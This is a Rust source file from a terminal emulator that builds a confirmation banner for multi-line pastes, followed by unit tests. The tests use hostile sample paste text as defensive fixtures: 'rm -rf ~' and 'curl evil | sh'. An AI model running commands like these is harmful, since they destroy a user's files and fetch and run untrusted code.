// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Andrew Yates

//! The multi-line-paste confirmation banner for platforms with no native alert (macOS asks
//! through a window sheet, Windows through a `MessageBoxW`).
//!
//! The pending paste is parked on `App` ([`PendingPaste`]), so nothing reaches the PTY until it
//! is answered, and this banner is spliced over the top grid rows with a sanitized preview and
//! the answer keys. Enter delivers the parked text through the confirmed seam; Escape or a click
//! on the banner drops it. Keys route through [`crate::alert_keys::confirm_key`], as the macOS
//! sheet's do. There is no TTL: the banner stands until answered, and closing the window drops
//! the parked text.
//!
//! The answer is bound to the session that asked. A tab click or `aterm ctl tab` can change the
//! front session while the banner stands, so Enter delivers to the parked session, through the
//! hidden-session seam if it is no longer in front.
//!
//! The row builder takes explicit `cols`/`panel_rows`, so it unit-tests without a window.

use aterm_core::terminal::RenderCell;
#[cfg(test)]
use aterm_render::Theme;

use crate::chrome_band;
use crate::settings::{blank_row, write_str};

/// Banner height without a separate keys row: the title plus up to [`MAX_PREVIEW_LINES`]
/// preview rows, the last of which becomes the "+N more" tally when the paste is longer.
const MAX_BANNER_ROWS: usize = 5;
/// How many lines of the pending paste are previewed at most.
const MAX_PREVIEW_LINES: usize = MAX_BANNER_ROWS - 1;

/// The banner's left margin and the preview's hanging indent, in cells.
const MARGIN: usize = 2;
const PREVIEW_INDENT: usize = MARGIN + 2;

/// One parked multi-line paste awaiting an answer. `App` holds it as `Option<PendingPaste>`:
/// `Some` means the banner is up, so there is at most one confirmation at a time. The text lives
/// only here: dropping the entry is the cancel, so no exit path leaks an unconfirmed paste.
pub(crate) struct PendingPaste {
    /// The window the paste targets; only its keys answer, and the entry dies with the window.
    pub(crate) wid: crate::WindowId,
    /// The terminal session that fronted `wid` at the paste gesture, and the only one the answer
    /// may reach. `None` when the window fronted native content, which keeps the ordinary
    /// front-content routing.
    pub(crate) session: Option<u64>,
    text: String,
    source: crate::input::Source,
    /// The DEC 2004 (bracketed paste) framing the question was asked under: the program can
    /// flip the mode while the banner stands, and the paste must reach the PTY framed as asked.
    framing: crate::input::PasteFraming,
    /// This question's serial, unique in the process and never `0`: the
    /// repaint key's term for it (`App::question_key`).
    serial: u64,
}

/// The next question serial (shared with `close_confirm`), never `0`.
pub(crate) fn next_question_serial() -> u64 {
    static NEXT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(1);
    NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
}

impl PendingPaste {
    // Built by `present_multiline_paste_banner` (neither macOS nor Windows) and by tests.
    #[cfg(any(test, not(any(target_os = "macos", windows))))]
    pub(crate) fn new(
        wid: crate::WindowId,
        session: Option<u64>,
        text: String,
        source: crate::input::Source,
        framing: crate::input::PasteFraming,
    ) -> Self {
        Self {
            wid,
            session,
            text,
            source,
            framing,
            serial: next_question_serial(),
        }
    }

    /// This question's serial (never `0`).
    pub(crate) fn serial(&self) -> u64 {
        self.serial
    }

    /// Surrender the parked paste for confirmed delivery: the window, the owning session, the
    /// text, its source and the framing the question was asked under.
    pub(crate) fn take(
        self,
    ) -> (
        crate::WindowId,
        Option<u64>,
        String,
        crate::input::Source,
        crate::input::PasteFraming,
    ) {
        (self.wid, self.session, self.text, self.source, self.framing)
    }

    /// The parked text, for the row builder.
    pub(crate) fn text(&self) -> &str {
        &self.text
    }

    /// Rows the banner wants in a window `cols` wide: title + preview (capped at
    /// [`MAX_PREVIEW_LINES`]), plus a row for the answer keys when they do not fit
    /// beside the question, so a narrow window still previews every line it would.
    pub(crate) fn wanted_rows(&self, cols: usize) -> usize {
        let keys_row = usize::from(title_row(&self.text, cols).1.is_none());
        paste_lines(&self.text).len().min(MAX_PREVIEW_LINES) + 1 + keys_row
    }
}

/// `s` cut to `max` cells, ending in an ellipsis when it does not fit. The close-confirm panel
/// uses it too.
pub(crate) fn ellipsized(s: &str, max: usize) -> String {
    if max == 0 {
        return String::new();
    }
    if s.chars().count() <= max {
        return s.to_string();
    }
    let mut out: String = s.chars().take(max.saturating_sub(1)).collect();
    out.push('\u{2026}');
    out
}

/// One preview line with every control character shown as a middle dot: a hostile clipboard's
/// ESC/C1 bytes and tabs must neither corrupt the band's cells (`write_str` writes one char per
/// cell) nor render as nothing.
fn sanitized(line: &str) -> String {
    line.chars()
        .map(|c| if c.is_control() { '\u{00b7}' } else { c })
        .collect()
}

/// The two keys that answer the question, right-aligned on the title row and spoken as the a11y
/// alert's description: one constant, so the banner and the screen reader offer the same answers.
pub(crate) const ANSWER_KEYS: &str = "Enter pastes \u{00b7} Esc cancels";

/// [`ANSWER_KEYS`] for a window too narrow to carry the verbs beside the question.
const ANSWER_KEYS_SHORT: &str = "Enter \u{00b7} Esc";

/// Why the paste is asked about: the guard fires only when bracketed paste is off,
/// so each line end submits. Named once for the band, its announcement, the macOS
/// sheet and the Windows dialog.
pub(crate) const RISK: &str = "Each line may run as a command.";

/// The accessible alert's description: the risk, then the answer keys.
#[cfg(a11y_tree)]
pub(crate) fn announcement_detail() -> String {
    format!("{RISK} {ANSWER_KEYS}")
}

/// Row 0's title and the answer keys that fit beside it in `cols`: the risk goes
/// first, then the verbs; `None` when even the short keys do not fit, and they take
/// a row of their own. [`banner_rows`] paints by it and
/// [`PendingPaste::wanted_rows`] sizes by it, so the two agree.
fn title_row(text: &str, cols: usize) -> (String, Option<&'static str>) {
    let question = format!("!  {}", question(text));
    let with_risk = format!("{question}  {RISK}");
    let fits = |title: &str, keys: &str| {
        cols.saturating_sub(keys.chars().count() + MARGIN) > MARGIN + title.chars().count() + 2
    };
    if fits(&with_risk, ANSWER_KEYS) {
        return (with_risk, Some(ANSWER_KEYS));
    }
    let keys = [ANSWER_KEYS, ANSWER_KEYS_SHORT]
        .into_iter()
        .find(|keys| fits(&question, keys));
    (question, keys)
}

/// The question the banner asks about `text`, as one sentence. The title row and the accessible
/// alert's name both come from here, so they cannot claim different line counts. Words
/// only: the painted warn mark is added by [`banner_rows`].
pub(crate) fn question(text: &str) -> String {
    format!("Paste {}?", lines_words(paste_lines(text).len()))
}

/// `1 line` / `N lines`: the count every confirmation names (the banner, the macOS sheet, the
/// Windows dialog).
pub(crate) fn lines_words(n: usize) -> String {
    if n == 1 {
        "1 line".to_string()
    } else {
        format!("{n} lines")
    }
}

/// The lines a paste would enter, split the way a shell reads them: LF, CRLF
/// and a lone CR each end one. One trailing line end is not a line of its own
/// (`make test\n` is one line, which its newline submits).
pub(crate) fn paste_lines(text: &str) -> Vec<&str> {
    if text.is_empty() {
        return Vec::new();
    }
    let body = text.strip_suffix('\n').unwrap_or(text);
    let body = body.strip_suffix('\r').unwrap_or(body);
    let mut parts = body.split('\n').peekable();
    let mut lines = Vec::new();
    while let Some(line) = parts.next() {
        // A CR is half of a CRLF only when an LF followed it; the last
        // segment's trailing CR ends a line of its own.
        let line = if parts.peek().is_some() {
            line.strip_suffix('\r').unwrap_or(line)
        } else {
            line
        };
        lines.extend(line.split('\r'));
    }
    lines
}

/// Pure row builder: exactly `panel_rows` rows, each exactly `cols` wide, so the splice
/// overwrites frame rows in place. Row 0 carries the [`question`] with the [`ANSWER_KEYS`]
/// right-aligned; the rows below preview the paste body, sanitized and ellipsized, with a
/// "+N more lines" tally when it overflows.
pub(crate) fn banner_rows(
    text: &str,
    cols: usize,
    panel_rows: usize,
    palette: impl Into<chrome_band::ChromePalette>,
) -> Vec<Vec<RenderCell>> {
    let c = chrome_band::band_colors(palette);
    let mut rows: Vec<Vec<RenderCell>> = (0..panel_rows)
        .map(|r| blank_row(cols, c.label, c.bar_bg, r == 0))
        .collect();
    if panel_rows == 0 {
        return rows;
    }
    let lines = paste_lines(text);
    let (title, row0_keys) = title_row(text, cols);
    // The answer keys are written in `value`, not the dim `label`: every other key is
    // swallowed, so they are the only way out and never drop.
    let mut first_preview = 1;
    if let Some(keys) = row0_keys {
        write_str(&mut rows[0], cols, MARGIN, &title, c.warn, c.bar_bg, true);
        let keys_col = cols.saturating_sub(keys.chars().count() + MARGIN);
        write_str(&mut rows[0], cols, keys_col, keys, c.value, c.bar_bg, true);
    } else if panel_rows > 1 {
        write_str(&mut rows[0], cols, MARGIN, &title, c.warn, c.bar_bg, true);
        let keys = if ANSWER_KEYS.chars().count() + 2 * MARGIN <= cols {
            ANSWER_KEYS
        } else {
            ANSWER_KEYS_SHORT
        };
        write_str(&mut rows[1], cols, MARGIN, keys, c.value, c.bar_bg, true);
        first_preview = 2;
    } else {
        // One row and no room for both: the keys keep their place at the right
        // and the question is cut to what is left.
        let keys_col = cols.saturating_sub(ANSWER_KEYS_SHORT.chars().count() + MARGIN);
        let title = ellipsized(&title, keys_col.saturating_sub(MARGIN + 1));
        write_str(&mut rows[0], cols, MARGIN, &title, c.warn, c.bar_bg, true);
        write_str(
            &mut rows[0],
            cols,
            keys_col,
            ANSWER_KEYS_SHORT,
            c.value,
            c.bar_bg,
            true,
        );
    }

    // Preview capacity: every row after the title (and the keys, when they took a
    // row), reserving the last for the "+N more" tally when the paste overflows
    // and there is room to say so.
    let capacity = panel_rows.saturating_sub(first_preview);
    let overflow = lines.len() > capacity;
    let shown = if overflow && capacity >= 2 {
        capacity - 1
    } else {
        capacity
    };
    let text_w = cols.saturating_sub(PREVIEW_INDENT + MARGIN);
    for (i, line) in lines.iter().take(shown).enumerate() {
        write_str(
            &mut rows[first_preview + i],
            cols,
            MARGIN,
            "\u{2502}",
            c.label,
            c.bar_bg,
            false,
        );
        write_str(
            &mut rows[first_preview + i],
            cols,
            PREVIEW_INDENT,
            &ellipsized(&sanitized(line), text_w),
            c.value,
            c.bar_bg,
            false,
        );
    }
    if overflow && shown < capacity {
        let more = format!("+{} more lines", lines.len() - shown);
        write_str(
            &mut rows[first_preview + shown],
            cols,
            PREVIEW_INDENT,
            &ellipsized(&more, text_w),
            c.label,
            c.bar_bg,
            false,
        );
    }
    // THE SEAM IS THE WHOLE EDGE, AND ONE TONE — the contract this
    // builder's header claims, which it was not actually keeping. The question and
    // the answer keys are written over the row `blank_row` seamed, and `write_str`
    // rebuilds each cell without an overline, so the band's top edge arrived as
    // stubs. Closed here, in the label tone: the row carries the warn title and the
    // full-tone answer keys, and the rule belongs to neither of them.
    chrome_band::seal_band_top(&mut rows[0], c.seam);
    rows
}

#[cfg(test)]
mod tests {
    use super::*;

    fn text_of(row: &[RenderCell]) -> String {
        row.iter().map(|cell| cell.ch).collect()
    }

    /// A lone CR submits a line at a bare prompt, which is why the guard asks
    /// about it, so the count and the preview split on it too.
    #[test]
    fn a_lone_carriage_return_counts_as_a_line() {
        assert_eq!(question("echo a\recho b"), "Paste 2 lines?");
        assert_eq!(question("a\r\nb\r\n"), "Paste 2 lines?");
        assert_eq!(question("a\nb\n"), "Paste 2 lines?");
        // The guard asks about these, so the count must not read 1; CR and LF
        // forms of the same text count alike.
        assert_eq!(question("a\r\r"), "Paste 2 lines?");
        assert_eq!(question("a\rb\r\r"), "Paste 3 lines?");
        assert_eq!(question("a\nb\n\n"), "Paste 3 lines?");
        // One command plus its newline is asked about when unbracketed.
        assert_eq!(question("make test\n"), "Paste 1 line?");
        let rows = banner_rows("echo a\recho b", 80, 3, Theme::default());
        assert!(
            text_of(&rows[1]).contains("echo a"),
            "{:?}",
            text_of(&rows[1])
        );
        assert!(
            text_of(&rows[2]).contains("echo b"),
            "{:?}",
            text_of(&rows[2])
        );
    }

    /// The seam is the band's top edge, so it runs the whole width even where the question and
    /// the answer keys are written (`write_str` rebuilds each cell with no overline).
    #[test]
    fn the_seam_runs_unbroken_and_one_toned_across_the_question_row() {
        let theme = Theme::default();
        let rows = banner_rows("ls\nrm -rf ~", 80, 3, theme);
        let question = &rows[0];
        assert!(
            question.iter().all(|cell| cell.overline),
            "the seam breaks at columns {:?}",
            question
                .iter()
                .enumerate()
                .filter(|(_, cell)| !cell.overline)
                .map(|(col, _)| col)
                .collect::<Vec<_>>()
        );
        // One tone: the row carries two inks, so a seam left to each cell's `fg` would change
        // colour along the hairline.
        let seams: std::collections::BTreeSet<Option<[u8; 3]>> =
            question.iter().map(|cell| cell.overline_color).collect();
        assert_eq!(
            seams.len(),
            1,
            "the rule takes as many tones as the band has inks: {seams:?}"
        );
        assert!(
            seams.iter().all(Option::is_some),
            "an uncoloured seam falls back to its cell's ink: {seams:?}"
        );
        let inks: std::collections::BTreeSet<[u8; 3]> =
            question.iter().map(|cell| cell.fg).collect();
        assert!(
            inks.len() > 1,
            "the question row is meant to carry two inks, so this proof is not vacuous: {inks:?}"
        );
        // Only the top row is an edge; the preview rows sit inside the band.
        assert!(rows[1].iter().all(|cell| !cell.overline));
    }

    /// A capped preview says it is capped: shown lines with no tally read as the whole paste.
    #[test]
    fn an_overflowing_paste_counts_what_it_hid() {
        let text: String = (0..20)
            .map(|i| format!("line {i}\n"))
            .collect::<Vec<_>>()
            .join("");
        let pending = PendingPaste::new(
            crate::WindowId(0),
            Some(11),
            text.clone(),
            test_source(),
            test_framing(),
        );
        assert_eq!(pending.wanted_rows(80), MAX_BANNER_ROWS);
        let rows = banner_rows(&text, 80, MAX_BANNER_ROWS, Theme::default());
        let last = text_of(&rows[MAX_BANNER_ROWS - 1]);
        // 5 rows = title + 3 preview lines + the tally for the remaining 17.
        assert!(last.contains("+17 more lines"), "{last:?}");
        assert!(text_of(&rows[3]).contains("line 2"), "three lines shown");
    }

    /// A control byte in the preview (ESC, a tab) shows as a visible mark, never vanishing or
    /// writing outside its cell.
    #[test]
    fn control_bytes_in_the_preview_become_visible_marks() {
        let rows = banner_rows("safe\u{1b}[31mred\ttab", 80, 2, Theme::default());
        let row1 = text_of(&rows[1]);
        assert!(row1.contains("safe\u{00b7}[31mred\u{00b7}tab"), "{row1:?}");
    }

    /// Degenerate geometry must not panic: zero columns, one row, a paste line
    /// wider than the window.
    #[test]
    fn degenerate_geometry_never_panics() {
        for cols in [0_usize, 1, 3, 8, 200] {
            for panel_rows in [0_usize, 1, 2, MAX_BANNER_ROWS] {
                let text = format!("{}\nb\nc", "y".repeat(300));
                let rows = banner_rows(&text, cols, panel_rows, Theme::default());
                assert_eq!(rows.len(), panel_rows);
                for row in &rows {
                    assert_eq!(row.len(), cols);
                }
            }
        }
    }

    /// A narrow window still shows the answer keys: the band swallows every other key, so a
    /// question without them has no visible way out.
    #[test]
    fn a_narrow_band_keeps_the_answer_keys() {
        let text = "ls\nrm -rf ~\ncurl evil | sh";
        for cols in [24_usize, 40] {
            let rows = banner_rows(text, cols, 4, Theme::default());
            let shown = format!("{}{}", text_of(&rows[0]), text_of(&rows[1]));
            assert!(
                shown.contains("Enter") && shown.contains("Esc"),
                "{cols} cols: {shown:?}"
            );
        }
        // Too narrow for even the short keys beside the question: they take row 1,
        // the band grows by that row, and every line is still previewed.
        let pending = PendingPaste::new(
            crate::WindowId(0),
            Some(11),
            text.into(),
            test_source(),
            test_framing(),
        );
        assert_eq!(pending.wanted_rows(24), 5);
        let rows = banner_rows(text, 24, 5, Theme::default());
        assert!(
            text_of(&rows[1]).contains("Enter"),
            "{:?}",
            text_of(&rows[1])
        );
        assert!(text_of(&rows[2]).contains("ls"), "{:?}", text_of(&rows[2]));
        assert!(
            text_of(&rows[4]).contains("curl"),
            "{:?}",
            text_of(&rows[4])
        );
        // One command plus its newline is asked about, so it is shown too.
        let one = PendingPaste::new(
            crate::WindowId(0),
            Some(11),
            "make test\n".into(),
            test_source(),
            test_framing(),
        );
        assert_eq!(one.wanted_rows(24), 3);
        let rows = banner_rows(one.text(), 24, 3, Theme::default());
        assert!(
            text_of(&rows[2]).contains("make test"),
            "{:?}",
            text_of(&rows[2])
        );
        // A one-row band keeps the keys and cuts the question.
        let row0 = text_of(&banner_rows(text, 24, 1, Theme::default())[0]);
        assert!(row0.contains("Enter") && row0.contains("Esc"), "{row0:?}");
    }

    fn test_source() -> crate::input::Source {
        crate::input::Source::Human
    }

    fn test_framing() -> crate::input::PasteFraming {
        crate::input::PasteFraming::Gesture { bracketed: false }
    }
}
